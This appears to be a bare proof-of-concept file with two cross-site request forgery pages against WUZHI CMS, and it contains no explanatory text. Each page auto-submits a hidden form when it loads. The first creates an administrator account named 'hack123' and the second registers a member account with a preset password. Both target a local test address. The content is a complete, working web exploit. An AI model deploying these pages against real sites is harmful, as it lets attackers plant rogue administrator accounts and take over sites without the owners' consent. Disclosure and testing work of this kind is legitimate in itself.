CSRF1
-----

    <html><body>
        <script type="text/javascript">
        function post(url,fields)
        {
        var p = document.createElement("form");
        p.action = url;
        p.innerHTML = fields;
        p.target = "_self";
        p.method = "post";
        document.body.appendChild(p);
        p.submit();
        }
        function csrf_hack()
        {
        var fields;

        fields += "<input type='hidden' name='form[role][]' value='1' />";
        fields += "<input type='hidden' name='form[username]' value='hack123' />";
        fields += "<input type='hidden' name='form[password]' value='' />";
        fields += "<input type='hidden' name='form[truename]' value='taoge@5ecurity' />";

        var url = "http://127.0.0.1/www/index.php?m=core&f=power&v=add&&_su=wuzhicms&_menuid=61&_submenuid=62&submit=提交";
        post(url,fields);
        }
        window.onload = function() { csrf_hack();}
        </script>
        </body></html>

CSRF2
-----

    <html><body>
    <script type="text/javascript">
    function post(url,fields)
    {
    var p = document.createElement("form");
    p.action = url;
    p.innerHTML = fields;
    p.target = "_self";
    p.method = "post";
    document.body.appendChild(p);
    p.submit();
    }
    function csrf_hack()
    {
    var fields;

    fields += "<input type='hidden' name='info[username]' value='hack123' />";
    fields += "<input type='hidden' name='info[password]' value='hacktest' />";
    fields += "<input type='hidden' name='info[pwdconfirm]' value='hacktest' />";
    fields += "<input type='hidden' name='info[email]' value='taoge@5ecurity.cn' />";
    fields += "<input type='hidden' name='info[mobile]' value='' />";
    fields += "<input type='hidden' name='modelids[]' value='10' />";
    fields += "<input type='hidden' name='info[groupid]' value='3' />";
    fields += "<input type='hidden' name='pids[]' value='0' />";
    fields += "<input type='hidden' name='pids[]' value='0' />";
    fields += "<input type='hidden' name='pids[]' value='0' />";
    fields += "<input type='hidden' name='pids[]' value='0' />";
    fields += "<input type='hidden' name='avatar' value='' />";
    fields += "<input type='hidden' name='islock' value='0' />";
    fields += "<input type='hidden' name='sys_name' value='0' />";
    fields += "<input type='hidden' name='info[birthday]' value='' />";
    fields += "<input type='hidden' name='info[truename]' value='' />";
    fields += "<input type='hidden' name='info[sex]' value='0' />";
    fields += "<input type='hidden' name='info[marriage]' value='0' />";

    var url = "http://127.0.0.1/www/index.php?m=member&f=index&v=add&_su=wuzhicms&_menuid=30&_submenuid=74&submit=提交";
    post(url,fields);
    }
    window.onload = function() { csrf_hack();}
    </script>
    </body></html>